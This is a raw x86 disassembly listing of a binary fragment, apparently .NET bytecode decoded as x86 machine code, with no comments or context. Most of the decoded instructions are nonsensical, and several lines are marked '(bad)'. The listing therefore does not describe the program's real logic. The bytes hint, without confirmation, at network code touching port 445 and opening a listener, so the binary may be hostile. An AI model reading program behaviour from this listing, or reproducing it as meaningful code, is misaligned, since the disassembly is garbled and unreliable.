  4030ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cf:	7c 00                	jl     0x4030d1
  4030d1:	00 0a                	add    %cl,(%edx)
  4030d3:	0b 2b                	or     (%ebx),%ebp
  4030d5:	1c 07                	sbb    $0x7,%al
  4030d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d8:	7d 00                	jge    0x4030da
  4030da:	00 0a                	add    %cl,(%edx)
  4030dc:	72 ca                	jb     0x4030a8
  4030de:	0d 00 70 6f 7e       	or     $0x7e6f7000,%eax
  4030e3:	00 00                	add    %al,(%eax)
  4030e5:	0a a5 6d 00 00 01    	or     0x100006d(%ebp),%ah
  4030eb:	18 34 04             	sbb    %dh,(%esp,%eax,1)
  4030ee:	17                   	pop    %ss
  4030ef:	0c de                	or     $0xde,%al
  4030f1:	27                   	daa
  4030f2:	07                   	pop    %es
  4030f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4030f4:	80 00 00             	addb   $0x0,(%eax)
  4030f7:	0a 2d dc de 0a 07    	or     0x70adedc,%ch
  4030fd:	2c 06                	sub    $0x6,%al
  4030ff:	07                   	pop    %es
  403100:	6f                   	outsl  %ds:(%esi),(%dx)
  403101:	70 00                	jo     0x403103
  403103:	00 0a                	add    %cl,(%edx)
  403105:	dc de                	(bad)
  403107:	0a 09                	or     (%ecx),%cl
  403109:	2c 06                	sub    $0x6,%al
  40310b:	09 6f 70             	or     %ebp,0x70(%edi)
  40310e:	00 00                	add    %al,(%eax)
  403110:	0a dc                	or     %ah,%bl
  403112:	de 03                	fiadds (%ebx)
  403114:	26 de 00             	fiadds %es:(%eax)
  403117:	16                   	push   %ss
  403118:	2a 08                	sub    (%eax),%cl
  40311a:	2a 00                	sub    (%eax),%al
  40311c:	01 40 00             	add    %eax,0x0(%eax)
  40311f:	00 02                	add    %al,(%edx)
  403121:	00 17                	add    %dl,(%edi)
  403123:	00 30                	add    %dh,(%eax)
  403125:	47                   	inc    %edi
  403126:	00 0a                	add    %cl,(%edx)
  403128:	00 00                	add    %al,(%eax)
  40312a:	00 00                	add    %al,(%eax)
  40312c:	02 00                	add    (%eax),%al
  40312e:	0b 00                	or     (%eax),%eax
  403130:	48                   	dec    %eax
  403131:	53                   	push   %ebx
  403132:	00 0a                	add    %cl,(%edx)
  403134:	00 00                	add    %al,(%eax)
  403136:	00 00                	add    %al,(%eax)
  403138:	02 00                	add    (%eax),%al
  40313a:	74 00                	je     0x40313c
  40313c:	28 9c 00 0a 00 00 00 	sub    %bl,0xa(%eax,%eax,1)
  403143:	00 02                	add    %al,(%edx)
  403145:	00 68 00             	add    %ch,0x0(%eax)
  403148:	40                   	inc    %eax
  403149:	a8 00                	test   $0x0,%al
  40314b:	0a 00                	or     (%eax),%al
  40314d:	00 00                	add    %al,(%eax)
  40314f:	00 00                	add    %al,(%eax)
  403151:	00 00                	add    %al,(%eax)
  403153:	00 b4 b4 00 03 13 00 	add    %dh,0x130300(%esp,%esi,4)
  40315a:	00 01                	add    %al,(%ecx)
  40315c:	13 30                	adc    (%eax),%esi
  40315e:	04 00                	add    $0x0,%al
  403160:	e5 01                	in     $0x1,%eax
  403162:	00 00                	add    %al,(%eax)
  403164:	00 00                	add    %al,(%eax)
  403166:	00 00                	add    %al,(%eax)
  403168:	1f                   	pop    %ds
  403169:	15 8d 57 00 00       	adc    $0x578d,%eax
  40316e:	01 25 16 72 f0 0d    	add    %esp,0xdf07216
  403174:	00 70 a2             	add    %dh,-0x5e(%eax)
  403177:	25 17 72 00 0e       	and    $0xe007217,%eax
  40317c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40317f:	25 18 72 0c 0e       	and    $0xe0c7218,%eax
  403184:	00 70 a2             	add    %dh,-0x5e(%eax)
  403187:	25 19 72 14 0e       	and    $0xe147219,%eax
  40318c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40318f:	25 1a 72 1e 0e       	and    $0xe1e721a,%eax
  403194:	00 70 a2             	add    %dh,-0x5e(%eax)
  403197:	25 1b 72 28 0e       	and    $0xe28721b,%eax
  40319c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40319f:	25 1c 72 36 0e       	and    $0xe36721c,%eax
  4031a4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031a7:	25 1d 72 40 0e       	and    $0xe40721d,%eax
  4031ac:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031af:	25 1e 72 4e 0e       	and    $0xe4e721e,%eax
  4031b4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031b7:	25 1f 09 72 62       	and    $0x6272091f,%eax
  4031bc:	0e                   	push   %cs
  4031bd:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031c0:	25 1f 0a 72 72       	and    $0x72720a1f,%eax
  4031c5:	0e                   	push   %cs
  4031c6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031c9:	25 1f 0b 72 80       	and    $0x80720b1f,%eax
  4031ce:	0e                   	push   %cs
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 1f 0c 72 8e       	and    $0x8e720c1f,%eax
  4031d7:	0e                   	push   %cs
  4031d8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031db:	25 1f 0d 72 a0       	and    $0xa0720d1f,%eax
  4031e0:	0e                   	push   %cs
  4031e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031e4:	25 1f 0e 72 b0       	and    $0xb0720e1f,%eax
  4031e9:	0e                   	push   %cs
  4031ea:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031ed:	25 1f 0f 72 cc       	and    $0xcc720f1f,%eax
  4031f2:	0e                   	push   %cs
  4031f3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031f6:	25 1f 10 72 dc       	and    $0xdc72101f,%eax
  4031fb:	0e                   	push   %cs
  4031fc:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031ff:	25 1f 11 72 ec       	and    $0xec72111f,%eax
  403204:	0e                   	push   %cs
  403205:	00 70 a2             	add    %dh,-0x5e(%eax)
  403208:	25 1f 12 72 0c       	and    $0xc72121f,%eax
  40320d:	0e                   	push   %cs
  40320e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403211:	25 1f 13 72 fa       	and    $0xfa72131f,%eax
  403216:	0e                   	push   %cs
  403217:	00 70 a2             	add    %dh,-0x5e(%eax)
  40321a:	25 1f 14 72 02       	and    $0x272141f,%eax
  40321f:	0f 00                	(bad)
  403221:	70 a2                	jo     0x4031c5
  403223:	80 09 00             	orb    $0x0,(%ecx)
  403226:	00 04 1e             	add    %al,(%esi,%ebx,1)
  403229:	8d 57 00             	lea    0x0(%edi),%edx
  40322c:	00 01                	add    %al,(%ecx)
  40322e:	25 16 72 24 0f       	and    $0xf247216,%eax
  403233:	00 70 a2             	add    %dh,-0x5e(%eax)
  403236:	25 17 72 34 0f       	and    $0xf347217,%eax
  40323b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40323e:	25 18 72 4c 0f       	and    $0xf4c7218,%eax
  403243:	00 70 a2             	add    %dh,-0x5e(%eax)
  403246:	25 19 72 5e 0f       	and    $0xf5e7219,%eax
  40324b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40324e:	25 1a 72 6c 0f       	and    $0xf6c721a,%eax
  403253:	00 70 a2             	add    %dh,-0x5e(%eax)
  403256:	25 1b 72 82 0f       	and    $0xf82721b,%eax
  40325b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40325e:	25 1c 72 92 0f       	and    $0xf92721c,%eax
  403263:	00 70 a2             	add    %dh,-0x5e(%eax)
  403266:	25 1d 72 a0 0f       	and    $0xfa0721d,%eax
  40326b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40326e:	80 0a 00             	orb    $0x0,(%edx)
  403271:	00 04 1d 8d 57 00 00 	add    %al,0x578d(,%ebx,1)
  403278:	01 25 16 72 b4 0f    	add    %esp,0xfb47216
  40327e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403281:	25 17 72 9e 0c       	and    $0xc9e7217,%eax
  403286:	00 70 a2             	add    %dh,-0x5e(%eax)
  403289:	25 18 72 e0 0f       	and    $0xfe07218,%eax
  40328e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403291:	25 19 72 c6 0c       	and    $0xcc67219,%eax
  403296:	00 70 a2             	add    %dh,-0x5e(%eax)
  403299:	25 1a 72 f6 0f       	and    $0xff6721a,%eax
  40329e:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032a1:	25 1b 72 fe 0f       	and    $0xffe721b,%eax
  4032a6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032a9:	25 1c 72 12 10       	and    $0x1012721c,%eax
  4032ae:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032b1:	80 0b 00             	orb    $0x0,(%ebx)
  4032b4:	00 04 1e             	add    %al,(%esi,%ebx,1)
  4032b7:	8d 57 00             	lea    0x0(%edi),%edx
  4032ba:	00 01                	add    %al,(%ecx)
  4032bc:	25 16 72 8e 0c       	and    $0xc8e7216,%eax
  4032c1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032c4:	25 17 72 e0 0f       	and    $0xfe07217,%eax
  4032c9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032cc:	25 18 72 9e 0c       	and    $0xc9e7218,%eax
  4032d1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032d4:	25 19 72 1e 10       	and    $0x101e7219,%eax
  4032d9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032dc:	25 1a 72 26 10       	and    $0x1026721a,%eax
  4032e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032e4:	25 1b 72 f6 0f       	and    $0xff6721b,%eax
  4032e9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032ec:	25 1c 72 c6 0c       	and    $0xcc6721c,%eax
  4032f1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032f4:	25 1d 72 fe 0f       	and    $0xffe721d,%eax
  4032f9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032fc:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  403300:	04 1e                	add    $0x1e,%al
  403302:	8d 57 00             	lea    0x0(%edi),%edx
  403305:	00 01                	add    %al,(%ecx)
  403307:	25 16 72 32 10       	and    $0x10327216,%eax
  40330c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40330f:	25 17 72 44 10       	and    $0x10447217,%eax
  403314:	00 70 a2             	add    %dh,-0x5e(%eax)
  403317:	25 18 72 56 10       	and    $0x10567218,%eax
  40331c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40331f:	25 19 72 68 10       	and    $0x10687219,%eax
  403324:	00 70 a2             	add    %dh,-0x5e(%eax)
  403327:	25 1a 72 7a 10       	and    $0x107a721a,%eax
  40332c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40332f:	25 1b 72 8c 10       	and    $0x108c721b,%eax
  403334:	00 70 a2             	add    %dh,-0x5e(%eax)
  403337:	25 1c 72 9e 10       	and    $0x109e721c,%eax
  40333c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40333f:	25 1d 72 b0 10       	and    $0x10b0721d,%eax
  403344:	00 70 a2             	add    %dh,-0x5e(%eax)
  403347:	80 0d 00 00 04 2a 00 	orb    $0x0,0x2a040000
  40334e:	00 00                	add    %al,(%eax)
  403350:	1b 30                	sbb    (%eax),%esi
  403352:	02 00                	add    (%eax),%al
  403354:	55                   	push   %ebp
  403355:	00 00                	add    %al,(%eax)
  403357:	00 14 00             	add    %dl,(%eax,%eax,1)
  40335a:	00 11                	add    %dl,(%ecx)
  40335c:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40335f:	00 06                	add    %al,(%esi)
  403361:	0a 06                	or     (%esi),%al
  403363:	2d 02 de 49 28       	sub    $0x2849de02,%eax
  403368:	31 00                	xor    %eax,(%eax)
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	6f                   	outsl  %ds:(%esi),(%dx)
  40336d:	32 00                	xor    (%eax),%al
  40336f:	00 0a                	add    %cl,(%edx)
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	33 00                	xor    (%eax),%eax
  403374:	00 0a                	add    %cl,(%edx)
  403376:	0b 7e 0e             	or     0xe(%esi),%edi
  403379:	00 00                	add    %al,(%eax)
  40337b:	04 0c                	add    $0xc,%al
  40337d:	16                   	push   %ss
  40337e:	0d 2b 24 08 09       	or     $0x908242b,%eax
  403383:	9a 13 04 06 11 04 28 	lcall  $0x2804,$0x11060413
  40338a:	2b 00                	sub    (%eax),%eax
  40338c:	00 0a                	add    %cl,(%edx)
  40338e:	13 05 11 05 28 2c    	adc    0x2c280511,%eax
  403394:	00 00                	add    %al,(%eax)
  403396:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  403399:	11 05 07 28 35 00    	adc    %eax,0x352807
  40339f:	00 06                	add    %al,(%esi)
  4033a1:	09 17                	or     %edx,(%edi)
  4033a3:	58                   	pop    %eax
  4033a4:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4033a9:	32 d6                	xor    %dh,%dl
  4033ab:	de 03                	fiadds (%ebx)
  4033ad:	26 de 00             	fiadds %es:(%eax)
  4033b0:	2a 00                	sub    (%eax),%al
  4033b2:	00 00                	add    %al,(%eax)
  4033b4:	01 10                	add    %edx,(%eax)
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	00 00                	add    %al,(%eax)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	51                   	push   %ecx
  4033bd:	51                   	push   %ecx
  4033be:	00 03                	add    %al,(%ebx)
  4033c0:	13 00                	adc    (%eax),%eax
  4033c2:	00 01                	add    %al,(%ecx)
  4033c4:	13 30                	adc    (%eax),%esi
  4033c6:	02 00                	add    (%eax),%al
  4033c8:	1e                   	push   %ds
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 15 00 00 11 1f    	add    %dl,0x1f110000
  4033d1:	1c 28                	sbb    $0x28,%al
  4033d3:	2a 00                	sub    (%eax),%al
  4033d5:	00 0a                	add    %cl,(%edx)
  4033d7:	72 c2                	jb     0x40339b
  4033d9:	10 00                	adc    %al,(%eax)
  4033db:	70 28                	jo     0x403405
  4033dd:	2b 00                	sub    (%eax),%eax
  4033df:	00 0a                	add    %cl,(%edx)
  4033e1:	0a 06                	or     (%esi),%al
  4033e3:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4033e6:	00 0a                	add    %cl,(%edx)
  4033e8:	2c 02                	sub    $0x2,%al
  4033ea:	06                   	push   %es
  4033eb:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	1b 30                	sbb    (%eax),%esi
  4033f2:	04 00                	add    $0x0,%al
  4033f4:	ba 00 00 00 16       	mov    $0x16000000,%edx
  4033f9:	00 00                	add    %al,(%eax)
  4033fb:	11 02                	adc    %eax,(%edx)
  4033fd:	72 d2                	jb     0x4033d1
  4033ff:	10 00                	adc    %al,(%eax)
  403401:	70 28                	jo     0x40342b
  403403:	2b 00                	sub    (%eax),%eax
  403405:	00 0a                	add    %cl,(%edx)
  403407:	0a 06                	or     (%esi),%al
  403409:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	2c 05                	sub    $0x5,%al
  403410:	dd a0 00 00 00 1d    	frstor 0x1d000000(%eax)
  403416:	8d 57 00             	lea    0x0(%edi),%edx
  403419:	00 01                	add    %al,(%ecx)
  40341b:	25 16 72 f8 10       	and    $0x10f87216,%eax
  403420:	00 70 a2             	add    %dh,-0x5e(%eax)
  403423:	25 17 06 a2 25       	and    $0x25a20617,%eax
  403428:	18 72 a1             	sbb    %dh,-0x5f(%edx)
  40342b:	11 00                	adc    %eax,(%eax)
  40342d:	70 a2                	jo     0x4033d1
  40342f:	25 19 03 a2 25       	and    $0x25a20319,%eax
  403434:	1a 72 d3             	sbb    -0x2d(%edx),%dh
  403437:	11 00                	adc    %eax,(%eax)
  403439:	70 a2                	jo     0x4033dd
  40343b:	25 1b 03 28 8e       	and    $0x8e28031b,%eax
  403440:	00 00                	add    %al,(%eax)
  403442:	0a a2 25 1c 72 0f    	or     0xf721c25(%edx),%ah
  403448:	12 00                	adc    (%eax),%al
  40344a:	70 a2                	jo     0x4033ee
  40344c:	28 8f 00 00 0a 0b    	sub    %cl,0xb0a0000(%edi)
  403452:	28 90 00 00 0a 72    	sub    %dl,0x720a0000(%eax)
  403458:	aa                   	stos   %al,%es:(%edi)
  403459:	12 00                	adc    (%eax),%al
  40345b:	70 28                	jo     0x403485
  40345d:	91                   	xchg   %eax,%ecx
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 0d 12 03 72 b6    	or     0xb6720312,%cl
  403466:	12 00                	adc    (%eax),%al
  403468:	70 28                	jo     0x403492
  40346a:	92                   	xchg   %eax,%edx
  40346b:	00 00                	add    %al,(%eax)
  40346d:	0a 72 ba             	or     -0x46(%edx),%dh
  403470:	12 00                	adc    (%eax),%al
  403472:	70 28                	jo     0x40349c
  403474:	34 00                	xor    $0x0,%al
  403476:	00 0a                	add    %cl,(%edx)
  403478:	28 2b                	sub    %ch,(%ebx)
  40347a:	00 00                	add    %al,(%eax)
  40347c:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40347f:	07                   	pop    %es
  403480:	28 93 00 00 0a 72    	sub    %dl,0x720a0000(%ebx)
  403486:	c4 12                	les    (%edx),%edx
  403488:	00 70 72             	add    %dh,0x72(%eax)
  40348b:	96                   	xchg   %eax,%esi
  40348c:	06                   	push   %es
  40348d:	00 70 08             	add    %dh,0x8(%eax)
  403490:	72 96                	jb     0x403428
  403492:	06                   	push   %es
  403493:	00 70 28             	add    %dh,0x28(%eax)
  403496:	34 00                	xor    $0x0,%al
  403498:	00 0a                	add    %cl,(%edx)
  40349a:	28 25 00 00 0a 26    	sub    %ah,0x260a0000
  4034a0:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  4034a3:	00 00                	add    %al,(%eax)
  4034a5:	28 3a                	sub    %bh,(%edx)
  4034a7:	00 00                	add    %al,(%eax)
  4034a9:	0a 08                	or     (%eax),%cl
  4034ab:	28 30                	sub    %dh,(%eax)
  4034ad:	00 00                	add    %al,(%eax)
  4034af:	0a de                	or     %dh,%bl
  4034b1:	03 26                	add    (%esi),%esp
  4034b3:	de 00                	fiadds (%eax)
  4034b5:	2a 00                	sub    (%eax),%al
  4034b7:	00 01                	add    %al,(%ecx)
  4034b9:	10 00                	adc    %al,(%eax)
  4034bb:	00 00                	add    %al,(%eax)
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	00 b6 b6 00 03 13    	add    %dh,0x130300b6(%esi)
  4034c5:	00 00                	add    %al,(%eax)
  4034c7:	01 b2 1a 8d 57 00    	add    %esi,0x578d1a(%edx)
  4034cd:	00 01                	add    %al,(%ecx)
  4034cf:	25 16 72 d4 12       	and    $0x12d47216,%eax
  4034d4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034d7:	25 17 72 e0 12       	and    $0x12e07217,%eax
  4034dc:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034df:	25 18 72 fc 12       	and    $0x12fc7218,%eax
  4034e4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034e7:	25 19 72 10 13       	and    $0x13107219,%eax
  4034ec:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034ef:	80 0e 00             	orb    $0x0,(%esi)
  4034f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	00 13                	add    %dl,(%ebx)
  4034f9:	30 02                	xor    %al,(%edx)
  4034fb:	00 2f                	add    %ch,(%edi)
  4034fd:	00 00                	add    %al,(%eax)
  4034ff:	00 17                	add    %dl,(%edi)
  403501:	00 00                	add    %al,(%eax)
  403503:	11 12                	adc    %edx,(%edx)
  403505:	00 28                	add    %ch,(%eax)
  403507:	94                   	xchg   %eax,%esp
  403508:	00 00                	add    %al,(%eax)
  40350a:	0a 7d 36             	or     0x36(%ebp),%bh
  40350d:	00 00                	add    %al,(%eax)
  40350f:	04 12                	add    $0x12,%al
  403511:	00 15 7d 35 00 00    	add    %dl,0x357d
  403517:	04 12                	add    $0x12,%al
  403519:	00 7c 36 00          	add    %bh,0x0(%esi,%esi,1)
  40351d:	00 04 12             	add    %al,(%edx,%edx,1)
  403520:	00 28                	add    %ch,(%eax)
  403522:	03 00                	add    (%eax),%eax
  403524:	00 2b                	add    %ch,(%ebx)
  403526:	12 00                	adc    (%eax),%al
  403528:	7c 36                	jl     0x403560
  40352a:	00 00                	add    %al,(%eax)
  40352c:	04 28                	add    $0x28,%al
  40352e:	96                   	xchg   %eax,%esi
  40352f:	00 00                	add    %al,(%eax)
  403531:	0a 2a                	or     (%edx),%ch
  403533:	00 1b                	add    %bl,(%ebx)
  403535:	30 03                	xor    %al,(%ebx)
  403537:	00 79 00             	add    %bh,0x0(%ecx)
  40353a:	00 00                	add    %al,(%eax)
  40353c:	18 00                	sbb    %al,(%eax)
  40353e:	00 11                	add    %dl,(%ecx)
  403540:	18 17                	sbb    %dl,(%edi)
  403542:	1c 73                	sbb    $0x73,%al
  403544:	97                   	xchg   %eax,%edi
  403545:	00 00                	add    %al,(%eax)
  403547:	0a 0a                	or     (%edx),%cl
  403549:	06                   	push   %es
  40354a:	20 b8 0b 00 00 6f    	and    %bh,0x6f00000b(%eax)
  403550:	98                   	cwtl
  403551:	00 00                	add    %al,(%eax)
  403553:	0a 06                	or     (%esi),%al
  403555:	20 b8 0b 00 00 6f    	and    %bh,0x6f00000b(%eax)
  40355b:	99                   	cltd
  40355c:	00 00                	add    %al,(%eax)
  40355e:	0a 06                	or     (%esi),%al
  403560:	02 20                	add    (%eax),%ah
  403562:	bd 01 00 00 6f       	mov    $0x6f000001,%ebp
  403567:	9a 00 00 0a 06 7e 16 	lcall  $0x167e,$0x60a0000
  40356e:	00 00                	add    %al,(%eax)
  403570:	04 6f                	add    $0x6f,%al
  403572:	9b                   	fwait
  403573:	00 00                	add    %al,(%eax)
  403575:	0a 26                	or     (%esi),%ah
  403577:	20 00                	and    %al,(%eax)
  403579:	01 00                	add    %eax,(%eax)
  40357b:	00 8d 4b 00 00 01    	add    %cl,0x100004b(%ebp)
  403581:	0b 06                	or     (%esi),%eax
  403583:	07                   	pop    %es
  403584:	6f                   	outsl  %ds:(%esi),(%dx)
  403585:	9c                   	pushf
  403586:	00 00                	add    %al,(%eax)
  403588:	0a 1f                	or     (%edi),%bl
  40358a:	44                   	inc    %esp
  40358b:	31 11                	xor    %edx,(%ecx)
  40358d:	07                   	pop    %es
  40358e:	1f                   	pop    %ds
  40358f:	44                   	inc    %esp
  403590:	91                   	xchg   %eax,%ecx
  403591:	19 33                	sbb    %esi,(%ebx)
  403593:	0a 06                	or     (%esi),%al
  403595:	6f                   	outsl  %ds:(%esi),(%dx)
  403596:	9d                   	popf
  403597:	00 00                	add    %al,(%eax)
  403599:	0a 17                	or     (%edi),%dl
  40359b:	0c de                	or     $0xde,%al
  40359d:	19 06                	sbb    %eax,(%esi)
  40359f:	6f                   	outsl  %ds:(%esi),(%dx)
  4035a0:	9d                   	popf
  4035a1:	00 00                	add    %al,(%eax)
  4035a3:	0a de                	or     %dh,%bl
  4035a5:	0a 06                	or     (%esi),%al
  4035a7:	2c 06                	sub    $0x6,%al
  4035a9:	06                   	push   %es
  4035aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ab:	70 00                	jo     0x4035ad
  4035ad:	00 0a                	add    %cl,(%edx)
  4035af:	dc de                	(bad)
  4035b1:	03 26                	add    (%esi),%esp
  4035b3:	de 00                	fiadds (%eax)
  4035b5:	16                   	push   %ss
  4035b6:	2a 08                	sub    (%eax),%cl
  4035b8:	2a 00                	sub    (%eax),%al
  4035ba:	00 00                	add    %al,(%eax)
  4035bc:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4035bf:	00 02                	add    %al,(%edx)
  4035c1:	00 09                	add    %cl,(%ecx)
  4035c3:	00 5d 66             	add    %bl,0x66(%ebp)
  4035c6:	00 0a                	add    %cl,(%edx)
	...
  4035d0:	72 72                	jb     0x403644
  4035d2:	00 03                	add    %al,(%ebx)
  4035d4:	13 00                	adc    (%eax),%eax
  4035d6:	00 01                	add    %al,(%ecx)
  4035d8:	1b 30                	sbb    (%eax),%esi
  4035da:	03 00                	add    (%eax),%eax
  4035dc:	d0 00                	rolb   $1,(%eax)
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	19 00                	sbb    %eax,(%eax)
  4035e2:	00 11                	add    %dl,(%ecx)
  4035e4:	14 0a                	adc    $0xa,%al
  4035e6:	7e 9e                	jle    0x403586
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	0a 20                	or     (%eax),%ah
  4035ec:	b3 15                	mov    $0x15,%bl
  4035ee:	00 00                	add    %al,(%eax)
  4035f0:	73 9f                	jae    0x403591
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	0a 0a                	or     (%edx),%cl
  4035f6:	06                   	push   %es
  4035f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f8:	a0 00 00 0a 38       	mov    0x380a0000,%al
  4035fd:	97                   	xchg   %eax,%edi
  4035fe:	00 00                	add    %al,(%eax)
  403600:	00 06                	add    %al,(%esi)
  403602:	6f                   	outsl  %ds:(%esi),(%dx)
  403603:	a1 00 00 0a 2d       	mov    0x2d0a0000,%eax
  403608:	0c 1f                	or     $0x1f,%al
  40360a:	64 28 3a             	sub    %bh,%fs:(%edx)
  40360d:	00 00                	add    %al,(%eax)
  40360f:	0a 38                	or     (%eax),%bh
  403611:	83 00 00             	addl   $0x0,(%eax)
  403614:	00 06                	add    %al,(%esi)
  403616:	6f                   	outsl  %ds:(%esi),(%dx)
  403617:	a2 00 00 0a 0b       	mov    %al,0xb0a0000
  40361c:	07                   	pop    %es
  40361d:	6f                   	outsl  %ds:(%esi),(%dx)
  40361e:	a3 00 00 0a 0c       	mov    %eax,0xc0a0000
  403623:	08 28                	or     %ch,(%eax)
  403625:	60                   	pusha
  403626:	00 00                	add    %al,(%eax)
  403628:	0a 73 a4             	or     -0x5c(%ebx),%dh
  40362b:	00 00                	add    %al,(%eax)
  40362d:	0a 0d 08 28 60 00    	or     0x602808,%cl
  403633:	00 0a                	add    %cl,(%edx)
  403635:	73 a5                	jae    0x4035dc
  403637:	00 00                	add    %al,(%eax)
  403639:	0a 25 17 6f a6 00    	or     0xa66f17,%ah
  40363f:	00 0a                	add    %cl,(%edx)
  403641:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  403644:	6f                   	outsl  %ds:(%esi),(%dx)
  403645:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403646:	00 00                	add    %al,(%eax)
  403648:	0a 13                	or     (%ebx),%dl
  40364a:	05 11 05 28 a8       	add    $0xa8280511,%eax
  40364f:	00 00                	add    %al,(%eax)
  403651:	0a 2d 12 11 05 28    	or     0x28051112,%ch
  403657:	3a 00                	cmp    (%eax),%al
  403659:	00 06                	add    %al,(%esi)
  40365b:	13 06                	adc    (%esi),%eax
  40365d:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403660:	06                   	push   %es
  403661:	6f                   	outsl  %ds:(%esi),(%dx)
  403662:	a9 00 00 0a de       	test   $0xde0a0000,%eax
  403667:	0c 11                	or     $0x11,%al
  403669:	04 2c                	add    $0x2c,%al
  40366b:	07                   	pop    %es
  40366c:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40366f:	70 00                	jo     0x403671
  403671:	00 0a                	add    %cl,(%edx)
  403673:	dc de                	(bad)
  403675:	0a 09                	or     (%ecx),%cl
  403677:	2c 06                	sub    $0x6,%al
  403679:	09 6f 70             	or     %ebp,0x70(%edi)
  40367c:	00 00                	add    %al,(%eax)
  40367e:	0a dc                	or     %ah,%bl
  403680:	de 0a                	fimuls (%edx)
  403682:	08 2c 06             	or     %ch,(%esi,%eax,1)
  403685:	08 6f 70             	or     %ch,0x70(%edi)
  403688:	00 00                	add    %al,(%eax)
  40368a:	0a dc                	or     %ah,%bl
  40368c:	de 0a                	fimuls (%edx)
  40368e:	07                   	pop    %es
  40368f:	2c 06                	sub    $0x6,%al
  403691:	07                   	pop    %es
  403692:	6f                   	outsl  %ds:(%esi),(%dx)
  403693:	70 00                	jo     0x403695
  403695:	00 0a                	add    %cl,(%edx)
  403697:	dc 0f                	fmull  (%edi)
  403699:	00 28                	add    %ch,(%eax)
  40369b:	aa                   	stos   %al,%es:(%edi)
  40369c:	00 00                	add    %al,(%eax)
  40369e:	0a 39                	or     (%ecx),%bh
  4036a0:	5d                   	pop    %ebp
  4036a1:	ff                   	(bad)
  4036a2:	ff                   	(bad)
  4036a3:	ff                   	lcall  (bad)
  4036a4:	de 0d 26 de 0a 06    	fimuls 0x60ade26
  4036aa:	2c 06                	sub    $0x6,%al
  4036ac:	06                   	push   %es
  4036ad:	28 ab 00 00 0a dc    	sub    %ch,-0x23f60000(%ebx)
  4036b3:	2a 01                	sub    (%ecx),%al
  4036b5:	4c                   	dec    %esp
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	02 00                	add    (%eax),%al
  4036ba:	5f                   	pop    %edi
  4036bb:	00 25 84 00 0c 00    	add    %ah,0xc0084
  4036c1:	00 00                	add    %al,(%eax)
  4036c3:	00 02                	add    %al,(%edx)
  4036c5:	00 4b 00             	add    %cl,0x0(%ebx)
  4036c8:	47                   	inc    %edi
  4036c9:	92                   	xchg   %eax,%edx
  4036ca:	00 0a                	add    %cl,(%edx)
  4036cc:	00 00                	add    %al,(%eax)
  4036ce:	00 00                	add    %al,(%eax)
  4036d0:	02 00                	add    (%eax),%al
  4036d2:	3f                   	aas
